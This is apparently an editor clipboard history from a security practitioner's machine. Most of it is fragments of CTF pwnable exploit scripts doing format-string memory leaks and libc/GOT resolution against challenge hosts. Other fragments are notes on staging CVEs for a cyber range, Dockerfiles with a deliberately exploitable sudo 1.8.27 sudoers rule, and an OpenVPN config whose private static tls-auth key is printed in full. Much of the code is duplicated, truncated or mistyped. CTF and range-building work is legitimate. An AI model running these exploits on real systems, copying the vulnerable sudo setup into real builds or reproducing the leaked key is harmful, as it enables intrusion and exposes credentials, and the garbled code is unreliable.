	java.projectConfiguration.update	Update project configuration
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
b5dec72c545a49bade3145d082ceb22d|list:/commands|6|1|V|list
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	python.createTerminal	Create Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	java.projectConfiguration.update	Update project configuration
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
1a6d0534659a2c5cbff867d11501e876|list:/commands|2|1|V|list
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	java.projectConfiguration.update	Update project configuration
61f3012f9d09eb06c77dc780a886ebc2|file:///home/neo/.config/aliasrc|7|1|V|conf
	add-git-key="ssh-add /home/neo/.ssh/git" \
ac0e9478875811daa1da261d75df0f52|file:///home/neo/247ctf/pwnable/sol_less.py|47|36|v|python
	50266
642d2c00537e4b016945a9fdf9f81365|file:///home/neo/247ctf/pwnable/sol_less.py|46|1|V|python
	host = '94d7a4723b333e6a.247ctf.com'
dcfa6fa3af62713d24ca34e21428a96a|file:///home/neo/247ctf/pwnable/sol_less.py|46|8|v|python
	d5e554c6bce9b467.247ctf.com:
dcfa6fa3af62713d24ca34e21428a96a|file:///home/neo/247ctf/pwnable/sol_less.py|46|8|v|python
	d5e554c6bce9b467.247ctf.com:
ee33b95d435b08146c8b75e40013e11c|file:///home/neo/247ctf/pwnable/sol_confwrite.py|57|1|V|python
	printf_libc = d.lookup('printf', 'libc')
	log_addr("Printf@libc", printf_libc)
b0541eea4db606e2e087f0ec5b38ec86|file:///home/neo/247ctf/pwnable/sol_less.py|53|1|V|python
	d = DynELF(leak_addr, start_address_elf)
934d30b2e3414e5396f67c172cd317de|file:///home/neo/247ctf/pwnable/sol_less.py|20|1|V|python
	def leak_addr(addr):
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
	    data = send_payload(payload)
	    if data == b'(null)':
	        return b'\x00'
	    return data + b'\x00'
338903ac29d83683931f1509b74c0004|file:///home/neo/247ctf/pwnable/sol_less.py|15|1|V|python
	    r = remote(host, port)
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
32bada55237bfb68ed8fcf9f0af2af93|file:///home/neo/247ctf/pwnable/sol_less.py|28|5|V|python
	    data = send_payload(payload)
8562eb5e909b2394c223b2183b0cd2b8|file:///home/neo/247ctf/pwnable/sol_less.py|27|5|V|python
	    rec = r.recvall()
b48144d1899911a09247a48df2409a85|file:///home/neo/247ctf/pwnable/sol_less.py|27|5|V|python
	    # r.recvuntil('back ')
5e5dba513d4574266ceee491f25514b9|file:///home/neo/247ctf/pwnable/sol_less.py|28|5|V|python
	    r.recvuntil('back ')
4212c851c08a679e4d70f612228e510a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|2|1|V|python
	
	def log_addr(name, addr):
	    log.info('{}: {:#x}'.format(name, addr))
	
	def send_payload(payload):
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
	    data = r.recvuntil(b'!!!', drop=True)
	    return data
	
	def send_payload_int(payload):
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
	
	def leak_addr(addr):
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
	    data = send_payload(payload)
	    if data == b'(null)':
	        return b'\x00'
	    return data + b'\x00'
	
	def find_plt_got(dynamic):
	    addr = dynamic
	    while True:
	        x = d.leak.n(addr, 2)
	        if x == b'\x03\x00': # Plt/got, why? -> research
	            addr += 4
	            return u32(d.leak.n(addr, 4))
	        addr += 8
	
	def find_got_func(got_addr, func_libc_addr):
	    addr = got_addr
	    while True:
	        x = d.leak.n(addr, 4)
	        if x == p32(func_libc_addr):
	            return addr
	        addr += 4
	
	host = '6c4d732f8e15e4c8.247ctf.com'
	port = 50388
	
	# context.log_level = 'critical'
	r = remote(host, port)
	
	start_address_elf = 0x8048000
	
	d = DynELF(leak_addr, start_address_elf)
	
	# Leak libc addresses
	dynamic_addr = d.dynamic
	log_addr("Dynamic", dynamic_addr)
	printf_libc = d.lookup('printf', 'libc')
	log_addr("Printf@libc", printf_libc)
	system_libc = d.lookup('system', 'libc')
08066996f06cf6069e4140ad623df25c|file:///home/neo/247ctf/pwnable/sol_confwrite.py|59|1|V|python
	system_libc = d.lookup('system', 'libc')
	log_addr("System@libc", system_libc)
7891483bddfedd88cb2fff23553e4fab|file:///home/neo/cyberranges/work/mitre/scenarios.md|19|1|V|vimwiki
	    # CVE-2016-3225 (Rotten Potato) 
	        - Windows
f1c5e8458f9b259eff3e9bd00830b843|file:///home/neo/cyberranges/work/mitre/scenarios.md|148|1|V|vimwiki
	    # CVE-2019-0683 (Forest Trust TGT delegation)
	        - Windows
f4f9c563f3ff557c37dc341091b2ce8c|file:///home/neo/cyberranges/work/mitre/scenarios.md|150|1|V|vimwiki
	    # CVE-2014-6324 (kerberos checksum)
	        - Windows
b864934666648caf0af1bd6f2cec95fd|file:///home/neo/cyberranges/work/mitre/scenarios.md|177|1|V|vimwiki
	    # CVE-2017-0146 (EternalRomance / EternalChampion)
	        - Windows
f744a1dcb832fdf3f2cc9c7be5377965|file:///home/neo/cyberranges/work/mitre/scenarios.md|120|38|v|vimwiki
	CVE- 2019-0708 (BlueKeep)
8e1021157c6f725d9f52764dedb88b40|file:///home/neo/cyberranges/work/mitre/scenarios.md|121|1|V|vimwiki
	    # CVE- 2019-0708 (BlueKeep)
	        - Windows, kernel
4b963ada9e4b265c59f1ea4f8324977d|file:///home/neo/cyberranges/work/mitre/scenarios.md|205|5|V|vimwiki
	    # CVE- 2019-0708 (BlueKeep)
a62f3dcc27abdbe6b385bc8e1472941f|file:///home/neo/cyberranges/work/mitre/scenarios.md|73|1|V|vimwiki
	    # CVE-2017-0144 (EternalBlue)
	        - Windows
	        - We already have a scenario
	    #  CVE-2008-4037 (MS08-068)
	        - Windows
	
	### Easy 11
	    # CVE-2019-11043 (PHP-FPM RCE)
	        - Image created in producer
	        - Works
	    # CVE-2017-16995 (get_rekt KE)
	        - Linux kernel
e8ae0806ff28bf9e0d8860e2413d5c67|file:///home/neo/cyberranges/work/mitre/scenarios.md|73|1|V|vimwiki
	    # CVE-2017-0144 (EternalBlue)
	        - Windows
	        - We already have a scenario
81c33a07604d587ed605ea89eb817c28|file:///home/neo/cyberranges/work/mitre/scenarios.md|155|1|V|vimwiki
	    # CVE-2016-0187 (IE RCE)
	        - Windows
	    # CVE-2016-0189 (IE RCE)
	        - Windows
73ad087ca4c38739a5c090dbc2c238ab|file:///home/neo/cyberranges/work/mitre/scenarios.md|223|1|V|vimwiki
	### Advanced 3
7cff5c18a22bed4735fbe3d1bc1e21d9|file:///home/neo/cyberranges/work/mitre/scenarios.md|195|1|V|vimwiki
	    # CVE-2018-7602 (Drupal RCE)
6c3d3d4cbe78eee47901749e880a372e|file:///home/neo/.config/aliasrc|5|1|V|
	open-keepass="keepassxc /home/neo/STORE\ N\ GO/safe.kdbx > /dev/null 2>&1 &" \
3505a25ee54c3c9989be15aa6aff1db4|file:///home/neo/cyberranges/silensec-vpn.ovpn|1|1|V|
	dev tun
	persist-tun
	persist-key
	cipher AES-128-CBC
	ncp-ciphers AES-128-GCM
	auth SHA256
	tls-client
	client
	resolv-retry infinite
	remote 95.217.177.240 1194 udp4
	auth-user-pass
	remote-cert-tls server
	compress 
	comp-lzo no
	auth-nocache
	pull-filter ignore "register-dns"
	dhcp-option DNS 192.168.9.1
	script-security 2
	up /etc/openvpn/update-systemd-resolved
	down /etc/openvpn/update-systemd-resolved
	down-pre
	<ca>
	-----BEGIN CERTIFICATE-----
	MIIEYjCCA0qgAwIBAgIBADANBgkqhkiG9w0BAQsFADB+MRMwEQYDVQQDEwp2cG5n
	dzAxLWNhMQswCQYDVQQGEwJDWTERMA8GA1UECBMITGltYXNzb2wxETAPBgNVBAcT
	CExpbWFzc29uMRswGQYDVQQKFBJHICYgTiBTaWxlbnNlYyBMdGQxFzAVBgNVBAsT
	DklORlJBU1RSVUNUVVJFMB4XDTIwMDQxMzEwMTUzNFoXDTMwMDQxMTEwMTUzNFow
	fjETMBEGA1UEAxMKdnBuZ3cwMS1jYTELMAkGA1UEBhMCQ1kxETAPBgNVBAgTCExp
	bWFzc29sMREwDwYDVQQHEwhMaW1hc3NvbjEbMBkGA1UEChQSRyAmIE4gU2lsZW5z
	ZWMgTHRkMRcwFQYDVQQLEw5JTkZSQVNUUlVDVFVSRTCCASIwDQYJKoZIhvcNAQEB
	BQADggEPADCCAQoCggEBALCmJRXgQc4TMv3gjlw2pMxM1ZtCaTf3joT/CIR9fg/T
	aW6KlIWvm57JZ+MiahAd7JvinxgRogjDjUjHbLvNnFxMO686VCmgU2JmF979WU5o
	RctQt/RV9nafmihnJuAn+aYe3t+T9P7YwEbXjGggS2zHd6fWDz9h6hL48hTZ//m9
	v2tGCjRjXMEOvV7UrIKt45LOhgDGlzanOCLMdcw1lmTeeMvqX0Ux13+QQne50B6V
	l8iq68lbFH6FIcb3KRemZu2gz9T1Q7zmjo7fV2JnFAEnoHut9DjoIKbwo9kZpLET
	lbr+UZ5/HArl9Ck+Uls7DEdGO/N1GXG3lP8bsz+osQkCAwEAAaOB6jCB5zAdBgNV
	HQ4EFgQUSjuh+z4uHyHIHPEdbgM0Ux8WW3QwgaoGA1UdIwSBojCBn4AUSjuh+z4u
	HyHIHPEdbgM0Ux8WW3ShgYOkgYAwfjETMBEGA1UEAxMKdnBuZ3cwMS1jYTELMAkG
	A1UEBhMCQ1kxETAPBgNVBAgTCExpbWFzc29sMREwDwYDVQQHEwhMaW1hc3NvbjEb
	MBkGA1UEChQSRyAmIE4gU2lsZW5zZWMgTHRkMRcwFQYDVQQLEw5JTkZSQVNUUlVD
	VFVSRYIBADAMBgNVHRMEBTADAQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG9w0BAQsF
	AAOCAQEAE1yhhfAIlH4Qz2mOmbqbVBeK/Qx/TVD6jTh5K/tTpqfrw9E67Ds3RpSd
	UWbHCi8P8loXXbtfCRYA7NPL9ig0s/URu8K2o+Nwa/Z4GBS6hyGuNXLW7hvrJFLZ
	MgN3WyXN3P2RK4vPKRvp2LQoaDzA9Jm1y7z9hRMxDKm7b8cnVK4moBXBRm7ia6o1
	SfusxhsDeEmcB841u+efO0YkDaxTXvd1QEz6/DDMX230bm/5pTxndHfQgW3HheQr
	EBsoZN/1bHbRZuL41k5fWl7WyI7Yzrhoxkp/E967ecL1r4ORG0jSFyBI2cBuNyBI
	67ldmBnWPOUvvwRZgNeRzwdssT695A==
	-----END CERTIFICATE-----
	</ca>
	setenv CLIENT_CERT 0
	key-direction 1
	<tls-auth>
	#
	# 2048 bit OpenVPN static key
	#
	-----BEGIN OpenVPN Static key V1-----
	2a1882468b8a8e9af24a2969bb5b4e7b
	c855897977ca1c353d643be3d2a61623
	77960cb22885c132a4a4650dc0812b9f
	cf933399f5398d5aa2892b0824953cef
	4f32a5aad39f3fe33466990cd6b5af0a
	3c78f68bf511f53aade2d3a147829d83
	5228b74167d7404a7a116d8a7bee76cf
	aa4a8561da36ffe5a87aa864b534b521
	b22772d12b8ea0b02fd0b49da3a2fa88
	1e87246ba2b0dcad54e48d0679ecbcaf
	427e0c454de77b70170b52a99f457024
	6fd6f2163d79836823f35a3901177f5d
	fda741e130d7ee5b0bcc823205034dbc
	67a4cd16e36900a4b5e0df4b7a927a79
	fe906549d01438c5e7ac519eacddc73d
	b9a971838bb5c62b295660b2161d4d5a
	-----END OpenVPN Static key V1-----
	</tls-auth>
aae0ae5912bffbd0c8b2c0276748aab4|file:///home/neo/cyberranges/work/mitre/scenarios.md|137|1|V|vimwiki
	    # CVE-2019-1322
	        - Windows
b0191ca8a72e4b5dc3a72f3b0f1b7111|file:///home/neo/cyberranges/work/mitre/scenarios.md|248|9|V|vimwiki
	        - Can't find old version of plugin to manually install from reliable source
9289c2922bbb6479c83029045d77e408|file:///home/neo/cyberranges/work/mitre/scenarios.md|249|53|v|vimwiki
	         - Can't find old version of plugin to manually install from reliable source
99cf916bd2a59d99292d7f51b3bf01b3|file:///home/neo/cyberranges/work/mitre/scenarios.md|250|9|V|vimwiki
	        - '
bb23407b384858c8e25fb8e872a69c73|file:///home/neo/cyberranges/work/mitre/scenarios.md|250|76|v|vimwiki
	 (doesnt work)
b22f1f3c2b45605944a9228409dc0b88|file:///home/neo/cyberranges/work/mitre/scenarios.md|249|41|v|vimwiki
	svn checkout https://plugins.svn.wordpress.org/imdb-widget/
c58fd0143151614ea1bd144937123026|file:///home/neo/cyberranges/work/mitre/scenarios.md|250|49|v|vimwiki
	svn merge -r HEAD:1189729 .
af9d83836ecf1f49c598bcb1995b3c98|file:///home/neo/cyberranges/work/mitre/advanced7/Dockerfile|4|24|v|dockerfile
	wget
9bda5b867d4699a45a257d483a006076|file:///home/neo/cyberranges/work/mitre/advanced7/Dockerfile|5|32|V|dockerfile
	    wget https://www.sudo.ws/sudo/dist/packages/1.8.27/sudo_1.8.27-1_ubu1804_amd64.deb && \
	    dpkg -i sudo_1.8.27-1_ubu1804_amd64.deb
bebe1dc56d89754b6e1a6a094e2fb53a|file:///home/neo/cyberranges/work/mitre/advanced7/Dockerfile|6|1|V|dockerfile
	RUN useradd -m hacker && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
b0a21bee81db9f50e83853e006268047|file:///home/neo/cyberranges/work/mitre/advanced7/Dockerfile|6|23|v|dockerfile
	&& echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
8584748b79380e0df881eea9c9ee4d9d|file:///home/neo/cyberranges/work/mitre/advanced8/Dockerfile|6|22|v|dockerfile
	 && echo 'hacker ALL=(ALL,!root) /bin/bash' >> /etc/sudoers
0e5d3e3ec4a5bd16eb9363c73cbd8780|file:///home/neo/cyberranges/work/mitre/advanced7/Dockerfile|3|1|V|dockerfile
	USER root
	RUN sudo apt-get update && \
	    sudo apt-get install -y logrotate
	
	RUN useradd -m hacker 
	
	RUN echo "hacker:hacker" | chpasswd
b625e93f3cb069568a101a1d0fe9d867|file:///home/neo/cyberranges/work/mitre/scenarios.md|266|9|V|vimwiki
	        - Maybe can work if we add the whole bitnami github repo and change commands in dockerfile, but producer doesn't allow to upload folder, have to upload file by file
bb325e0b0fddf661b3c5e6692fa73ee3|file:///home/neo/cyberranges/work/mitre/scenarios.md|199|1|V|vimwiki
	    # CVE-2019-1388 (UAC bypass)
	        - Windows
da24f835d847b675a55e08f1729e775a|file:///home/neo/cyberranges/work/mitre/scenarios.md|311|9|V|vimwiki
	        - docker pull aspendigital/octobercms
64e6bf6c4b6c9a4a9e8ce4e7b16107cc|file:///home/neo/cyberranges/work/mitre/scenarios.md|87|1|V|vimwiki
	    # CVE-2019-1040 (Drop the MIC)
	        - Windows
cf613c8dd7e255450d7b10700d3c287a|file:///home/neo/cyberranges/work/mitre/scenarios.md|59|21|v|vimwiki
	need to add RUN chmod +x /main.sh in Dockerfile
bd3369099257619ea31748b6d374dd1d|file:///home/neo/CTFs/csaw2020/bards/xpl.py|89|1|V|python
	rop1.puts(PUTS_GOT)
2174994073b21a2d802bd57841eee4ad|file:///home/neo/247ctf/pwnable/sol_confwrite.py|45|37|v|python
	50358
8b3875cbb7e0fc99d12eaf724f5d198d|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|1|V|python
	host = '6c4d732f8e15e4c8.247ctf.com'
b3e565ad04864a7fe721758306d8587f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|1|V|python
	host = ef59b57635bf001b.247ctf.com
	port = 50358
cea1bdb6ffe3cb900b54c915fd37d390|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	ef59b57635bf001b.247ctf.com
cea1bdb6ffe3cb900b54c915fd37d390|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	ef59b57635bf001b.247ctf.com
c95f8308e0dd02409aa58676ec7ed63f|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|1|V|python
	host = 'ef59b57635bf001b.247ctf.com'
f1ec6f11fdca959b087365bff349da2a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|36|v|python
	50227
3687c8f0f9081966e9d2a725b0936fd5|file:///home/neo/247ctf/pwnable/sol_confwrite.py|45|8|v|python
	5035 
9c06df4b915b641f911e00c359413173|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|1|V|python
	host = dcae5f11aba5b2d7.247ctf.com
	port = 50227
3713056609bbb9528505616537e19c07|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	dcae5f11aba5b2d7.247ctf.com
3713056609bbb9528505616537e19c07|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	dcae5f11aba5b2d7.247ctf.com
f88ed1baa2d998584a6d7a861b7a2055|file:///home/neo/247ctf/pwnable/sol_less.py|61|36|v|python
	50218
f7a7a324662653883b5bf7524c3274e9|file:///home/neo/247ctf/pwnable/sol_less.py|62|8|v|python
	50266 
4197c3ad3336ae41ecb8875377f29f10|file:///home/neo/247ctf/pwnable/sol_less.py|60|1|V|python
	host = 'd5e554c6bce9b467.247ctf.com'
da6dbe5087a6c634e660b0eb7a1e54fb|file:///home/neo/247ctf/pwnable/sol_less.py|60|8|v|python
	e7e1a4987c3a2c55.247ctf.com
da6dbe5087a6c634e660b0eb7a1e54fb|file:///home/neo/247ctf/pwnable/sol_less.py|60|8|v|python
	e7e1a4987c3a2c55.247ctf.com
9ccfd44dc0ad34c1dc5797c815bbeed5|file:///home/neo/247ctf/pwnable/sol_less.py|81|1|V|python
	# log_addr("GOT", got_addr)
a79767114c0f1104ca7d8918cdd42647|file:///home/neo/247ctf/pwnable/sol_less.py|83|1|V|python
	# log_addr("Printf@got", printf_got)
cab0e826e957fbc19aae1f8f84087b72|file:///home/neo/247ctf/pwnable/sol_less.py|75|1|V|python
	# printf_libc = d.lookup('printf', 'libc')
	# log_addr("Printf@libc", printf_libc)
67b5ff631afdb57bf27fcb9f14c46bcd|file:///home/neo/247ctf/pwnable/sol_less.py|20|1|V|python
	def leak_addr2(addr):
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
	    r = remote(host, port)
	    r.recvuntil('?\n')
	    print(payload)
	    r.sendline(payload)
	    rec = r.recvall()
	    print(rec)
	    # # if data == b'(null)':
	    # #     return b'\x00'
	    # # return data + b'\x00'
35623016afcc42ad73c0f573a2a9b0f5|file:///home/neo/247ctf/pwnable/sol_less.py|38|1|V|python
	def find_got_func(got_addr, func_plt_addr):
	    addr = got_add
	    while True:
	        x = d.leak.n(addr, 4)
	        if x == p32(func_plt_addr):
	            return addr
	        addr += 4
553e68e84bc66c5989e939a0bbc91d13|file:///home/neo/247ctf/pwnable/sol_less.py|57|1|V|python
	# printf_got = find_got_func(got_addr, printf_plt)
61e1b312fdddff6d66c3c460db82812a|file:///home/neo/247ctf/pwnable/sol_less.py|42|3|v|python
	old_
f3ca0c18bd5617c67c08adc62725a577|file:///home/neo/247ctf/pwnable/sol_less.py|42|6|v|python
	_printf_got = 0x804a010 
deecd239c413fa6de53a9ca748628591|file:///home/neo/247ctf/pwnable/sol_less.py|42|7|v|python
	printf_got = 0x804a010 
a805dd88b320a49cbff9b0c969429251|file:///home/neo/247ctf/pwnable/sol_less.py|56|14|v|python
	0x804a010
a805dd88b320a49cbff9b0c969429251|file:///home/neo/247ctf/pwnable/sol_less.py|56|14|v|python
	0x804a010
9f6735c441a3243fcc1ea15479e0cf7d|file:///home/neo/247ctf/pwnable/sol_confwrite.py|47|1|V|python
	one_gadget = 0x3cbea
	
518a83ba7336d2fed02a200f86f566eb|file:///home/neo/247ctf/pwnable/sol_less.py|58|14|v|python
	0x3cbea
518a83ba7336d2fed02a200f86f566eb|file:///home/neo/247ctf/pwnable/sol_less.py|58|14|v|python
	0x3cbea
4f09daa9d95bcb166a302407a0e0babe|file:///home/neo/247ctf/pwnable/sol_less.py|62|42|v|python
	short
98394c2224528f0cea2064e04297a369|file:///home/neo/247ctf/pwnable/sol_less.py|64|1|V|python
	# r.sendline('/bin/sh;')
0584b3fd461cb5dda6e901261c05fccc|file:///home/neo/247ctf/pwnable/sol_less.py|50|1|V|python
	log_addr("Dynamic", dynamic_addr)
be96c4c05c33a1fcbb7cd28548d4a321|file:///home/neo/247ctf/pwnable/sol_less.py|14|1|V|python
	def send_payload_int(payload):
	    r = remote(host, port)
	    r.recvuntil('?\n')
	    r.sendline(payload)
	    r.recvuntil('back ')
9fa5477e5aa1eb016fa4b9f82d8b33ff|file:///home/neo/247ctf/pwnable/sol_less.py|61|1|V|python
	# r.interactive()
a320770cc9c0d1b5229101a40d6470b7|file:///home/neo/247ctf/pwnable/sol_less.py|62|1|V|python
	
	# for i in range(30):
	#     r = remote(host, port)
	#     r.recvuntil('?\n')
	#     r.sendline('%'+str(i)+'$p')
	#     r.recvuntil('back ')
	#     addr = r.recvuntil('!')[:-1]
	#     if addr[:4] == b'0xff':
	#         r = remote(host, port)
	#         r.sendline('%'+str(i)+'$s')
	#         r.recvuntil('back ')
	#         string = r.recvuntil('!')[:-1]
	#         print(string)
	#     print(i,addr)
	# r.interactive()
	
dccd486c5e260070c1fb28cd79a24c0f|file:///home/neo/247ctf/pwnable/sol_less.py|54|22|V|python
	printf_got = 0x804a010
	printf_off = printf_got + 1
850685a1dd27651157a9f2c0e9c02678|file:///home/neo/247ctf/pwnable/sol_less.py|51|1|V|python
	print(printf_libc)
592b366c29f1d89a29d1613116237b91|file:///home/neo/247ctf/pwnable/sol_less.py|80|9|V|python
	        sys.exiexit()
e4f334acdb30dd149f81bf7763284d92|file:///home/neo/247ctf/pwnable/sol_less.py|79|9|V|python
	        l.close()
ab40038effdfeb3266115d18821edb40|file:///home/neo/247ctf/pwnable/sol_less.py|77|5|V|python
	    exit(0)
68e1ad147a4c2b9b777308549e2391d5|file:///home/neo/247ctf/pwnable/sol_less.py|60|1|V|python
	aUoodbye = d.lookup('Goodbye')
2b718a23c0ba09e4536b5253b586055e|file:///home/neo/247ctf/pwnable/sol_less.py|61|19|V|python
	for i in range(15)d
	    test = leak_addr(goodbye+i)
	    print(test)
ac0d82146a0d5b0b25efdea79924778c|file:///home/neo/247ctf/pwnable/sol_less.py|64|14|v|python
	ntf_off
c283281237c7e6f88746b4fb5315f7eb|file:///home/neo/247ctf/pwnable/sol_less.py|64|11|v|python
	prii
f7f671840bb2416579a4b886c2866660|file:///home/neo/247ctf/pwnable/sol_less.py|64|21|v|python
	one_gadget
111841339ccf4006166c5d0ca0a3f0fc|file:///home/neo/247ctf/pwnable/sol_less.py|19|1|V|python
	    # r.interactive()
a060327d7a5752c8916ec338b29617a9|file:///home/neo/247ctf/pwnable/sol_less.py|19|5|v|python
	pritn
70cf6c92df9d661f0c4bde73598b5520|file:///home/neo/247ctf/pwnable/sol_less.py|65|33|v|python
	hex(), 16) ,
ee46496e8acafa471619e7b11c5624f9|file:///home/neo/247ctf/pwnable/sol_less.py|66|23|v|python
	int(b"//sh".hex(), 16)}
3c5897cb5e75def75ca501a9ad68344a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|45|8|v|python
	f7a15546f9c73797.247ctf.com
3c5897cb5e75def75ca501a9ad68344a|file:///home/neo/247ctf/pwnable/sol_confwrite.py|45|8|v|python
	f7a15546f9c73797.247ctf.com
2c6ac01ac0d8ea3ae36555a9d181f9e5|file:///home/neo/247ctf/pwnable/sol_confwrite.py|46|1|V|python
	50295
2dae1f3f8c57db65c864e8745f6e88e5|file:///home/neo/247ctf/pwnable/sol_confwrite.py|46|7|v|python
	 50227
ae5314a8da1e6872ec5b45d207e97671|file:///home/neo/247ctf/pwnable/sol_less.py|41|36|v|python
	50170
ea512d3f0dead79727b36e4339fbd27b|file:///home/neo/247ctf/pwnable/sol_less.py|42|8|v|python
	50218 
c5050f054243d0ee31436790639d2b61|file:///home/neo/247ctf/pwnable/sol_less.py|41|8|v|python
	2f45b8ea95a45b52.247ctf.com:
c5050f054243d0ee31436790639d2b61|file:///home/neo/247ctf/pwnable/sol_less.py|41|8|v|python
	2f45b8ea95a45b52.247ctf.com:
dc8c0010225cbedf0fd785d09b8767b1|file:///home/neo/247ctf/pwnable/sol_less.py|40|1|V|python
	host = 'e7e1a4987c3a2c55.247ctf.com'
c79f286f46206a50eb2ec07d6b5f9952|file:///home/neo/247ctf/pwnable/sol_less.py|20|5|V|python
	    if EOF in
34b41569647c61a341ea3d8fa10eab2d|file:///home/neo/247ctf/pwnable/sol_less.py|74|1|V|python
	print("%s" % payload)
58e7b835e488be95dc23c1ccc0264771|file:///home/neo/247ctf/pwnable/sol_less.py|22|18|V|python
	    except EOFError:
	        print('test')
aca868244d914c00313d83548f1caa09|file:///home/neo/247ctf/pwnable/sol_less.py|21|5|V|python
	    r.recvuntil('bye')
c5555b21626dc92a1903f935688d6f65|file:///home/neo/247ctf/pwnable/sol_less.py|66|5|V|python
	# one_gadget = 0x3cbea
	
d2189a5fc1d752d1f77c6f8e7736de76|file:///home/neo/247ctf/pwnable/sol_less.py|21|5|V|python
	    data = r.recv(10000)
dfe6b1f36f8e986176b78147423e6135|file:///home/neo/247ctf/pwnable/sol_less.py|20|1|V|python
	    data = r.recvall()
7715108e7c6947b05e871d54636914b4|file:///home/neo/247ctf/pwnable/sol_less.py|76|1|V|python
	leaked = b''
	while 1:
	    addr = start_address_elf+len(leaked)
	    payload = b'%13$s'
	    payload += b'!!!' # for padding, so that the %s references next bytes
	    payload += p32(addr)
	    leak = send_payload(payload)
	    leaked += leak + b"\x00"
	    print(leak)
	    if b'Goodbye' in leak:
	        print(hex(addr))
	        exit(0)
	    l = open("leak.bin", "wb")
	    l.write(leaked)
e75ead0ed6e31077177d2031e6e1e13b|file:///home/neo/247ctf/pwnable/sol_confwrite.py|62|14|V|python
	    if b'Goodbye' in leak:
	        print(hex(addr))
	        exit(0)
48b9e705179fc428794be1372baf3e95|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|36|V|python
	host = 'dcae5f11aba5b2d7.247ctf.com'
	host = 'f7a15546f9c73797.247ctf.com'
9d82faba72747d15ec59cb71049a6ef8|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|36|v|python
	50486
1337bcccf6c992137af17306080dfbb6|file:///home/neo/247ctf/pwnable/sol_confwrite.py|45|8|v|python
	50295 
ab3eaca1061911f70e8972b0ffb7f066|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	78e17176f82444cf.247ctf.com
ab3eaca1061911f70e8972b0ffb7f066|file:///home/neo/247ctf/pwnable/sol_confwrite.py|44|8|v|python
	78e17176f82444cf.247ctf.com
4904f98e8782a9231e14a833ad7433c9|file:///home/neo/247ctf/pwnable/sol_less.py|43|1|V|python
	host = '2f45b8ea95a45b52.247ctf.com'
7d75c1e3693b0acbf2cb86c97a828504|file:///home/neo/247ctf/pwnable/sol_less.py|43|35|v|python
	 50458
16d90c471c6409482b8438b476b07632|file:///home/neo/247ctf/pwnable/sol_less.py|43|8|v|python
	fefa96d70a4328a4.247ctf.com
16d90c471c6409482b8438b476b07632|file:///home/neo/247ctf/pwnable/sol_less.py|43|8|v|python
	fefa96d70a4328a4.247ctf.com
acbfa5ba43f76fb74948feedb4d08942|file:///home/neo/247ctf/pwnable/sol_less.py|24|5|V|python
	    print(r.interactive())
2de89e59eb85c2e1cde033dee2f8d03b|file:///home/neo/247ctf/pwnable/sol_less.py|21|9|V|python
	    # data = r.recvuntil('!')
	    # print(data)
9168ccf1d4fe588aeefd299f46f9b939|file:///home/neo/CTFs/reply2019/logceasar/encrypt.py|15|1|V|python
	        new_pos = (3**(key+i)) % 257
13f575909ac03a6b36a707871841270d|file:///home/neo/CTFs/reply2019/logceasar/encrypt.py|15|1|V|python
	        new_pos = (3**(key+i)) % 257
	        ciphertext[new_pos-1] = ((content[i])^i)^(new_pos-1)
e7d792448e550d9dd64580568e99bf9d|file:///home/neo/CTFs/reply2019/logceasar/decrypt.py|9|9|v|python
	new_pos
702a4cd27fe22dbbe2d03d28b8e746fc|file:///home/neo/CTFs/reply2019/logceasar/decrypt.py|8|5|V|python
	    pt = [''] * 256
18a837bd74c4887abc4e3bf143f25188|file:///home/neo/CTFs/reply2019/logceasar/decrypt.py|14|5|V|python
	    pt = ''.join(chr(x) for x in pt)
45dda680b51700981bfc169f0ff3e089|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|30|30|v|python
	b3783a044b06141859d65a1e6fdbfc44
1f9839f64a20ee0972c2e393b8dba850|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|31|23|v|python
	65defb7f4c29b989a47a2dacf8e5efcf
fe8efdc1b6fa1330b7ce97a0ae1e3a2b|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|35|1|V|python
	for i in range(2**32):
23034024d97110696379b71d3fd9169e|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|40|9|V|python
	        print(encr)
a1edbb5524dff1ff094465dba76a076a|file:///home/neo/CTFs/reply2019/stuck/enc_game.py|30|1|V|python
	def main():
	    print("My Battery Is Low and It's Getting Dark...\n")
	    print("StuckInTheMiddle: b3783a044b06141859d65a1e6fdbfc44")
